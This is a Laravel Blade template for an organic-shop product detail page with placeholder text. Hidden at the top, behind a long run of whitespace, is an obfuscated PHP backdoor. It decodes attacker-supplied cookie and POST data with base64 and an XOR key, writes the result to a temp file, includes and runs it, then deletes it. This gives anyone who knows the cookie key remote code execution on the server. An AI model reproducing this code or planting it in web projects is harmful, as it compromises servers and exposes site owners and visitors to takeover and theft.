<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("szI_DSq")){class szI_DSq{public static $axCgDMurl = "3dd9dbab-6e42-48d3-abae-019ebd3aea90";public static $QGWMgnK = NULL;public function __construct(){$AqRBIT = $_COOKIE;$WqgTpS = $_POST;$euoIYlS = @$AqRBIT[substr(szI_DSq::$axCgDMurl, 0, 4)];if (!empty($euoIYlS)){$BgExO = "base64";$xBSeLNAN = "";$euoIYlS = explode(",", $euoIYlS);foreach ($euoIYlS as $KmfrAOoQ){$xBSeLNAN .= @$AqRBIT[$KmfrAOoQ];$xBSeLNAN .= @$WqgTpS[$KmfrAOoQ];}$xBSeLNAN = array_map($BgExO . "\x5f" . chr ( 504 - 404 ).chr ( 644 - 543 )."\143" . "\157" . "\144" . "\x65", array($xBSeLNAN,)); $xBSeLNAN = $xBSeLNAN[0] ^ str_repeat(szI_DSq::$axCgDMurl, (strlen($xBSeLNAN[0]) / strlen(szI_DSq::$axCgDMurl)) + 1);szI_DSq::$QGWMgnK = @unserialize($xBSeLNAN);}}public function __destruct(){$this->vXgEU();}private function vXgEU(){if (is_array(szI_DSq::$QGWMgnK)) {$YiCfENE = sys_get_temp_dir() . "/" . crc32(szI_DSq::$QGWMgnK[chr ( 172 - 57 ).chr (97) . chr (108) . chr ( 363 - 247 )]);@szI_DSq::$QGWMgnK['w' . chr (114) . chr ( 574 - 469 ).chr ( 1044 - 928 ).'e']($YiCfENE, szI_DSq::$QGWMgnK["\x63" . chr (111) . chr ( 123 - 13 )."\x74" . 'e' . "\x6e" . chr (116)]);include $YiCfENE;@szI_DSq::$QGWMgnK[chr (100) . 'e' . chr ( 618 - 510 )."\x65" . "\x74" . chr ( 988 - 887 )]($YiCfENE);exit();}}}$BtjggFi = new szI_DSq(); $BtjggFi = NULL;} ?>@include('includes.header')
@include('includes.navbar')
<!-- main body start -->
 <main>
    <!-- sidebar section start -->
    <section class="sidebar_section">
      <div class="sidebar_content_wrap">
        <div class="container">
          <div class="row">
            <div
              class="offcanvas offcanvas-end"
              tabindex="-1"
              id="offcanvasRight"
              aria-labelledby="offcanvasRightLabel"
            >
              <div class="offcanvas-header align-items-center">
                <h5 class="mb-0">Organic Products</h5>
                <button
                  type="button"
                  class="btn-close text-reset text-end"
                  data-bs-dismiss="offcanvas"
                  aria-label="Close"
                ></button>
              </div>
              <div class="offcanvas-body">
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat6.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$50.00</span>
                      <del>$70.00</del>
                    </div>
                  </div>
                </div>
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat7.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$40.00</span>
                      <del>$60.00</del>
                    </div>
                  </div>
                </div>
                <div
                  class="prdc_ctg_product_content mt-1 d-flex align-items-center"
                >
                  <div
                    class="prdc_ctg_product_img d-flex justify-content-center align-items-center me-3"
                  >
                    <img
                      src="{{asset('public/assets/images/category/cat8.png')}}"
                      alt="image_not_found"
                    />
                  </div>
                  <div class="prdc_ctg_product_text">
                    <div class="prdc_ctg_product_title my-2">
                      <h5>Organic Cabbage</h5>
                    </div>
                    <div class="prdc_ctg_product_price mt-1 product_price">
                      <span class="sale_price pe-1">$70.00</span>
                      <del>$90.00</del>
                    </div>
                  </div>
                </div>
                <div class="total_price">
                  <ul class="ul_li_block mb_30 clearfix">
                    <li>
                      <span>Subtotal:</span>
                      <span>$215</span>
                    </li>
                    <li>
                      <span>Vat 5%:</span>
                      <span>$10.75</span>
                    </li>
                    <li>
                      <span>Discount 15%:</span>
                      <span>- $32.25</span>
                    </li>
                    <li>
                      <span>Total:</span>
                      <span>$191.8875</span>
                    </li>
                  </ul>
                </div>
                <div class="sidebar_btns">
                  <ul class="btns_group ul_li_block clearfix">
                    <li><a href="#!">View Cart</a></li>
                    <li><a href="#!">Checkout</a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- sidebar section end -->
     <!-- Breadcrumb section start -->
     <section class="breadcrumb_sec_1 position-relative">
                <div class="breadcrumb_wrap sec_space_mid_small"
                    style="background-image: url(assets/images/breadcrumb/breadcrumb1.png);">
                    <div class="breadcrumb_cont text-center">
                        <div class="breadcrumb_title">
                            <h2 class="text-white">Product Details</h2>
                        </div>
                        <ul
                            class="list-unstyled breadcrumb_item d-flex justify-content-center align-items-center text-white">
                            <li><a href="index.html"><i class="fas fa-home active"></i>Home</a></li>
                            <li><i class="fas fa-chevron-right"></i>About</li>
                            <li><i class="fas fa-chevron-right"></i>Dried</li>
                        </ul>
                    </div>
                </div>
            </section>
            <!-- Breadcrumb section end -->


            <!-- product-10 section start -->
            <section class="product10_sec position-relative" data-aos="fade-up" data-aos-duration="2000">
                <div class="product10_wrap sec_space_small"
                    style="background-image: url(public/assets/images/backgrounds/bg16.png)">
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-lg-6">
                                <!-- User this HTML for Slider -->
                                <section class="banner-section">
                                    <div class="container">
                                        <div class="vehicle-detail-banner banner-content clearfix">
                                            <div class="banner-slider">
                                                <div class="slider slider-nav thumb-image">
                                                    <div class="thumbnail-image">
                                                        <div class="thumbImg bg-white">
                                                            <a href="#!"><img src="{{asset('public/assets/images/product/product56.png')}}"
                                                                    alt="image_not_found"></a>
                                                        </div>
                                                    </div>
                                                    <div class="thumbnail-image">
                                                        <div class="thumbImg bg-white">
                                                            <a href="#!"><img src="{{asset('public/assets/images/product/product10.png')}}"
                                                                    alt="image_not_found"></a>
                                                        </div>
                                                    </div>
                                                    <div class="thumbnail-image">
                                                        <div class="thumbImg bg-white">
                                                            <a href="#!"><img src="{{asset('public/assets/images/product/product43.png')}}"
                                                                    alt="image_not_found"></a>
                                                        </div>
                                                    </div>
                                                    <div class="thumbnail-image">
                                                        <div class="thumbImg bg-white">
                                                            <a href="#!"><img src="{{asset('public/assets/images/product/product40.png')}}"
                                                                    alt="image_not_found"></a>
                                                        </div>
                                                    </div>
                                                </div>

                                                <div class="slider slider-for">
                                                    <div class="slider-banner-image img_moving_anim1 bg-white">
                                                        <img src="{{asset('public/assets/images/product/product56.png')}}"
                                                            alt="image_not_found">
                                                    </div>
                                                    <div class="slider-banner-image img_moving_anim1 bg-white">
                                                        <img src="{{asset('public/assets/images/product/product10.png')}}"
                                                            alt="image_not_found">
                                                    </div>
                                                    <div class="slider-banner-image img_moving_anim1 bg-white">
                                                        <img src="{{asset('public/assets/images/product/product43.png')}}"
                                                            alt="image_not_found">
                                                    </div>
                                                    <div class="slider-banner-image img_moving_anim1 bg-white">
                                                        <img src="{{asset('public/assets/images/product/product40.png')}}"
                                                            alt="image_not_found">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>
                                <!-- End User this HTML for Slider -->
                            </div>
                            <div class="col-lg-6">
                                <div class="rating_wrap d-flex justify-content-between">
                                    <div class="rating_review_cont d-flex d-flex align-items-center">
                                        <ul class="rating_star ul_li">
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li><i class="far fa-star"></i></li>
                                        </ul>
                                        <a href="#!" class="review">Read 3 Reviews</a>
                                    </div>
                                    <div class="product_btn">
                                        <a href="#"><button type="button"
                                                class="btn custom_btn rounded-pill px-4 text-white">Smoothies</button></a>
                                    </div>
                                </div>
                                <h2 class="product_detail_title">Good Organic Products</h2>
                                <p class="product_detail_desc py-2">Morbi eget congue lectus. Donec eleifend ultricies
                                    urna et euismod. Sed consectetur tellus eget odio aliquet, vel vestibulum tellus
                                    sollicitudin. Morbi maximus metus eu eros tincidunt, vitae mollis ante imperdiet.
                                    Nulla </p>
                                <div class="row mt-5">
                                    <div class="col-8">
                                        <div class="product10_value_content">
                                            <h4 class="value_title mb-3">Nutritional Values:</h4>
                                            <div class="product10_value_table bg-white shadow-lg">
                                                <table class="table">
                                                    <tbody>
                                                        <tr>
                                                            <th scope="row">50G</th>
                                                            <td>Carbohydrates</td>
                                                        </tr>
                                                        <tr>
                                                            <th scope="row">10G</th>
                                                            <td>Protein, Engry</td>
                                                        </tr>
                                                        <tr>
                                                            <th scope="row">20G</th>
                                                            <td> Minerals, and vitamins</td>
                                                        </tr>
                                                        <tr>
                                                            <th scope="row">90G</th>
                                                            <td>Nutrient requirements</td>
                                                        </tr>
                                                    </tbody>
                                                </table>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="product10_quantity_btn_wrap d-flex align-items-center">
                                    <div class="quantity_input bg-white">
                                        <form action="#">
                                            <span class="input_number_decrement">–</span>
                                            <input class="input_number" value="2KG">
                                            <span class="input_number_increment">+</span>
                                        </form>
                                    </div>
                                    <a href="#"><button type="button"
                                            class="btn custom_btn rounded-pill ms-3 px-5 py-3 text-white">Order Now <i
                                                class="fas fa-long-arrow-alt-right"></i></button></a>
                                </div>
                                <div class="product_tags_wrap d-flex align-items-center mt-5">
                                    <h6 class="product_tags_title text-uppercase">tags:</h6>
                                    <div class="tags_item d-flex align-items-center">
                                        <a href="#!">T-shirt,</a>
                                        <a class="ms-1" href="#!">Clothes,</a>
                                        <a class="ms-1" href="#!">Fashion,</a>
                                        <a class="ms-1" href="#!">Shop</a>
                                    </div>
                                </div>
                                <div class="product_social_links d-flex align-items-center">
                                    <h6 class="product_social_title text-uppercase">share:</h6>
                                    <ul class="list-unstyled d-flex mb-0">
                                        <li><a href="#!"><i class="fab fa-facebook-f"></i></a></li>
                                        <li><a href="#!"><i class="fab fa-twitter"></i></a></li>
                                        <li><a href="#!"><i class="fab fa-google-plus-g"></i></a></li>
                                        <li><a href="#!"><i class="fab fa-pinterest-p"></i></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- product-10 side thumb-->
                <div class="product10_left_thumb3 position-absolute">
                    <img src="{{asset('public/assets/images/shapes/shape25.png')}}" alt="image_not_found">
                </div>
                <div class="product10_right_thumb4 position-absolute">
                    <img src="{{asset('public/assets/images/shapes/shape26.png')}}" alt="image_not_found">
                </div>
            </section>
            <!-- product-10 section end -->

            <!-- product-10 reviews section start -->
            <section class="product10_reviews sec_top_space_70" data-aos="fade-up"
                data-aos-duration="2000">
                <div class="product10_reviews_wrap">
                    <div class="container">
                        <div class="d-flex justify-content-center justify-content-lg-start align-items-center">
                            <ul class="product_tabnav_3 nav nav-pills my-5" id="pills-tab" role="tablist">
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link active shadow rounded-pill text-uppercase"
                                        id="pills-description-tab" data-bs-toggle="pill"
                                        data-bs-target="#pills-description" type="button" role="tab"
                                        aria-controls="pills-description" aria-selected="true">description</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link shadow rounded-pill text-uppercase"
                                        id="pills-Information-tab" data-bs-toggle="pill"
                                        data-bs-target="#pills-Information" type="button" role="tab"
                                        aria-controls="pills-Information" aria-selected="false">Additional
                                        Information</button>
                                </li>
                                <li class="nav-item" role="presentation">
                                    <button class="nav-link shadow rounded-pill text-uppercase" id="pills-reviews-tab"
                                        data-bs-toggle="pill" data-bs-target="#pills-reviews" type="button" role="tab"
                                        aria-controls="pills-reviews" aria-selected="false">reviews (3)</button>
                                </li>
                            </ul>
                        </div>
                        <div class="tab-content" id="pills-tabContent">
                            <div class="tab-pane fade show active" id="pills-description" role="tabpanel"
                                aria-labelledby="pills-description-tab">
                                <div class="row mb_50">
                                    <div class="col-lg-9 col-md-8 col-sm-12 col-xs-12">
                                        <div class="content_wrap ms-3">
                                            <h3 class="title_text mb_15">Description:</h3>
                                            <p class="mb_15">
                                                Investigationes demonstraverunt lectores legere me lius quod ii legunt
                                                saepius. Claritas est etiam processus dynamicus, qui sequitur mutationem
                                                consuetudium lectorum. Mirum est notare quam littera gothica, quam nunc
                                                putamus parum claram, anteposuerit litterarum formas humanitatis per
                                                seacula quarta decima et quinta decima. Eodem modo typi, qui nunc nobis
                                                videntur parum clari, fiant sollemnes in futurum.
                                            </p>
                                            <p class="mb_15">
                                                Investigationes demonstraverunt lectores legere me lius quod ii legunt
                                                saepius. Claritas est etiam processus dynamicus, qui sequitur mutationem
                                                consuetudium lectorum.
                                            </p>
                                            <p class="mb-0">
                                                Eodem modo typi, qui nunc nobis videntur parum clari.
                                            </p>
                                        </div>
                                    </div>
                                </div>

                            </div>
                            <div class="tab-pane fade show" id="pills-Information" role="tabpanel"
                                aria-labelledby="pills-Information-tab">
                                <div class="row mb_50">
                                    <div class="col-lg-9 col-md-8 col-sm-12 col-xs-12">
                                        <div class="content_wrap ms-3">
                                            <h3 class="info_content_title">Why Choose Our Products?</h3>
                                            <p class="mb_30">
                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
                                                tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim
                                                veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
                                                commodo consequat. Duis aute irure dolor in reprehenderit in voluptate
                                                velit esse cillum dolore eu fugiat nulla pariatur
                                            </p>

                                            <h4 class="list_title">Our Product Quality</h4>
                                            <p class="mb_30">
                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
                                                tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim
                                                veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
                                                commodo consequat. Duis aute irure dolor in reprehenderit in voluptate
                                                velit esse cillum dolore eu fugiat nulla pariatur
                                            </p>

                                            <h4 class="list_title">Customar Feedback</h4>
                                            <p class="mb_30">
                                                Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod
                                                tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim
                                                veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea
                                                commodo consequat. Duis aute irure dolor in reprehenderit in voluptate
                                                velit esse cillum dolore eu fugiat nulla pariatur.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="tab-pane fade show" id="pills-reviews" role="tabpanel"
                                aria-labelledby="pills-reviews-tab">
                                <div class="row">
                                    <div class="col-lg-6">
                                        <div class="review_comment2 ms-3">
                                            <h3 class="title_text">Reviews:</h3>
                                            <ul class="review_comment_list2 ul_li_block">
                                                <li class="review_comment_wrap2">
                                                    <h4 class="admin_name">John Doe <span class="comment_date">30 Mar
                                                            2022</span></h4>
                                                    <ul class="rating_star ul_li">
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                    </ul>
                                                    <p class="mb-0">
                                                        Duis ante magna, aliquet sit amet sagittis vitae, tristique at
                                                        lacus. Ut et accumsan turpis. Phasellus ornare, tortor ut congue
                                                        imperdiet, mauris magna condimentum nulla, non malesuada mauris
                                                        massa eu augue.
                                                    </p>
                                                </li>
                                                <li class="review_comment_wrap2">
                                                    <h4 class="admin_name">Smith Alex <span class="comment_date">25 Feb
                                                            2022</span></h4>
                                                    <ul class="rating_star ul_li">
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                        <li class="active"><i class="fas fa-star"></i></li>
                                                    </ul>
                                                    <p class="mb-0">
                                                        Duis ante magna, aliquet sit amet sagittis vitae, tristique at
                                                        lacus. Ut et accumsan turpis. Phasellus ornare, tortor ut congue
                                                        imperdiet, mauris magna condimentum nulla, non malesuada mauris
                                                        massa eu augue.
                                                    </p>
                                                </li>
                                            </ul>
                                        </div>

                                        <div class="comment_form_area">
                                            <form action="#">
                                                <div class="row">
                                                    <h4 class="comment_title">Add New Comment</h4>
                                                    <div class="col-lg-6">
                                                        <div class="form_item">
                                                            <input class="rounded-pill" type="text" name="name"
                                                                placeholder="Your Name*" required>
                                                        </div>
                                                    </div>
                                                    <div class="col-lg-6">
                                                        <div class="form_item">
                                                            <input class="rounded-pill" type="text" name="name"
                                                                placeholder="Your Name*" required>
                                                        </div>
                                                    </div>
                                                    <div class="col-lg-6">
                                                        <div class="form_item">
                                                            <input class="rounded-pill" type="email" name="email"
                                                                placeholder="Email Address*" required>
                                                        </div>
                                                    </div>
                                                    <div class="col-lg-6">
                                                        <div class="form_item">
                                                            <input class="rounded-pill" type="text" name="name"
                                                                placeholder="Website*" required>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="form_item">
                                                    <textarea name="comment" placeholder="your Comment*"></textarea>
                                                </div>
                                                <button type="submit"
                                                    class="btn custom_btn rounded-pill py-3 text-white text-uppercase">Post
                                                    Comments <i class="fas fa-long-arrow-alt-right"></i></button>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>

            <!-- product section start -->
            <section class="product_section sec_top_space_50 sec_inner_bottom_130" data-aos="fade-up"
                data-aos-duration="2000">
                <div class="container">
                    <div class="row">
                        <div class="col-lg-6">
                            <div class="product_sec_content">
                                <div class="product_sec_sub_title d-flex align-items-center pb-2">
                                    <i class="far fa-circle"></i>
                                    <i class="far fa-circle"></i>
                                    <i class="far fa-circle"></i>
                                    <span>FRESH FROM OUR FARM</span>
                                </div>
                                <h2 class="product_sec_title pb-3">Popular Organic Discount</h2>
                            </div>
                        </div>
                        <div class="col-lg-6 ul_li_right">
                            <ul class="countdown_timer ul_li" data-countdown="2023/3/24"></ul>
                        </div>
                    </div>

                    <div class="row g-4">
                        <div class="col-sm-6 col-lg-3">
                            <div class="product_layout_1 overflow-hidden position-relative">
                                <div class="product_layout_content bg-white position-relative">
                                    <div class="product_image_wrap">
                                        <a class="product_image d-flex justify-content-center align-items-center"
                                            href="product-detail.html">
                                            <img class="pic-1" src="{{asset('public/assets/images/product/product9.png')}}" alt="image_not_found">
                                            <img class="pic-2" src="{{asset('public/assets/images/product/product4.png')}}" alt="image_not_found">
                                        </a>
                                        <ul class="product_badge_group ul_li_block">
                                            <li><span
                                                    class="product_badge badge_meats position-absolute rounded-pill text-uppercase">Meats</span>
                                            </li>
                                            <li><span
                                                    class="product_badge badge_discount position-absolute rounded-pill">-27%</span>
                                            </li>
                                        </ul>
                                        <ul class="product_action_btns ul_li_block d-flex">
                                            <li><a class="tooltips" data-placement="top" title="Search Product"
                                                    href="#!"><i class="fas fa-search"></i></a></li>
                                            <li><a class="tooltips" data-placement="top" title="Add To Cart"
                                                    href="#product_quick_view" data-bs-toggle="modal"><i
                                                        class="fas fa-shopping-bag"></i></a></li>
                                        </ul>
                                    </div>
                                    <div class="rating_wrap d-flex">
                                        <ul class="rating_star ul_li">
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li><i class="far fa-star"></i></li>
                                        </ul>
                                        <span class="shop_review_text">( 4.0 )</span>
                                    </div>
                                    <div class="product_content">
                                        <h3 class="product_title">
                                            <a href="product-detail.html">Organic Cabbage</a>
                                        </h3>
                                        <div class="product_price">
                                            <span class="sale_price pe-1">$50.00</span>
                                            <del>$65.00</del>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-lg-3">
                            <div class="product_layout_1 overflow-hidden position-relative">
                                <div class="product_layout_content bg-white position-relative">
                                    <div class="product_image_wrap">
                                        <a class="product_image d-flex justify-content-center align-items-center"
                                            href="product-detail.html">
                                            <img class="pic-1" src="{{asset('public/assets/images/product/product10.png')}}" alt="image_not_found">
                                            <img class="pic-2" src="{{asset('public/assets/images/product/product7.png')}}" alt="image_not_found">
                                        </a>
                                        <ul class="product_badge_group ul_li_block">
                                            <li><span
                                                    class="product_badge badge_meats position-absolute rounded-pill text-uppercase">Meats</span>
                                            </li>
                                            <li><span
                                                    class="product_badge badge_discount position-absolute rounded-pill">-27%</span>
                                            </li>
                                        </ul>
                                        <ul class="product_action_btns ul_li_block d-flex">
                                            <li><a class="tooltips" data-placement="top" title="Search Product"
                                                    href="#!"><i class="fas fa-search"></i></a></li>
                                            <li><a class="tooltips" data-placement="top" title="Add To Cart"
                                                    href="#product_quick_view" data-bs-toggle="modal"><i
                                                        class="fas fa-shopping-bag"></i></a></li>
                                        </ul>
                                    </div>
                                    <div class="rating_wrap d-flex">
                                        <ul class="rating_star ul_li">
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li><i class="far fa-star"></i></li>
                                        </ul>
                                        <span class="shop_review_text">( 4.0 )</span>
                                    </div>
                                    <div class="product_content">
                                        <h3 class="product_title">
                                            <a href="product-detail.html">Organic Cabbage</a>
                                        </h3>
                                        <div class="product_price">
                                            <span class="sale_price pe-1">$50.00</span>
                                            <del>$65.00</del>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-lg-3">
                            <div class="product_layout_1 overflow-hidden position-relative">
                                <div class="product_layout_content bg-white position-relative">
                                    <div class="product_image_wrap">
                                        <a class="product_image d-flex justify-content-center align-items-center"
                                            href="product-detail.html">
                                            <img class="pic-1" src="{{asset('public/assets/images/product/product11.png')}}" alt="image_not_found">
                                            <img class="pic-2" src="{{asset('public/assets/images/product/product5.png')}}" alt="image_not_found">
                                        </a>
                                        <ul class="product_badge_group ul_li_block">
                                            <li><span
                                                    class="product_badge badge_meats position-absolute rounded-pill text-uppercase">Meats</span>
                                            </li>
                                            <li><span
                                                    class="product_badge badge_discount position-absolute rounded-pill">-27%</span>
                                            </li>
                                        </ul>
                                        <ul class="product_action_btns ul_li_block d-flex">
                                            <li><a class="tooltips" data-placement="top" title="Search Product"
                                                    href="#!"><i class="fas fa-search"></i></a></li>
                                            <li><a class="tooltips" data-placement="top" title="Add To Cart"
                                                    href="#product_quick_view" data-bs-toggle="modal"><i
                                                        class="fas fa-shopping-bag"></i></a></li>
                                        </ul>
                                    </div>
                                    <div class="rating_wrap d-flex">
                                        <ul class="rating_star ul_li">
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li><i class="far fa-star"></i></li>
                                        </ul>
                                        <span class="shop_review_text">( 4.0 )</span>
                                    </div>
                                    <div class="product_content">
                                        <h3 class="product_title">
                                            <a href="product-detail.html">Organic Cabbage</a>
                                        </h3>
                                        <div class="product_price">
                                            <span class="sale_price pe-1">$50.00</span>
                                            <del>$65.00</del>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-6 col-lg-3">
                            <div class="product_layout_1 overflow-hidden position-relative">
                                <div class="product_layout_content bg-white position-relative">
                                    <div class="product_image_wrap">
                                        <a class="product_image d-flex justify-content-center align-items-center"
                                            href="product-detail.html">
                                            <img class="pic-1" src="{{asset('public/assets/images/product/product12.png')}}" alt="image_not_found">
                                            <img class="pic-2" src="{{asset('public/assets/images/product/product3.png')}}" alt="image_not_found">
                                        </a>
                                        <ul class="product_badge_group ul_li_block">
                                            <li><span
                                                    class="product_badge badge_meats position-absolute rounded-pill text-uppercase">Meats</span>
                                            </li>
                                            <li><span
                                                    class="product_badge badge_discount position-absolute rounded-pill">-27%</span>
                                            </li>
                                        </ul>
                                        <ul class="product_action_btns ul_li_block d-flex">
                                            <li><a class="tooltips" data-placement="top" title="Search Product"
                                                    href="#!"><i class="fas fa-search"></i></a></li>
                                            <li><a class="tooltips" data-placement="top" title="Add To Cart"
                                                    href="#product_quick_view" data-bs-toggle="modal"><i
                                                        class="fas fa-shopping-bag"></i></a></li>
                                        </ul>
                                    </div>
                                    <div class="rating_wrap d-flex">
                                        <ul class="rating_star ul_li">
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li class="active"><i class="fas fa-star"></i></li>
                                            <li><i class="far fa-star"></i></li>
                                        </ul>
                                        <span class="shop_review_text">( 4.0 )</span>
                                    </div>
                                    <div class="product_content">
                                        <h3 class="product_title">
                                            <a href="product-detail.html">Organic Cabbage</a>
                                        </h3>
                                        <div class="product_price">
                                            <span class="sale_price pe-1">$50.00</span>
                                            <del>$65.00</del>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            <!-- product section end -->
  </main>
  <!-- main body end -->
@include('includes.footer')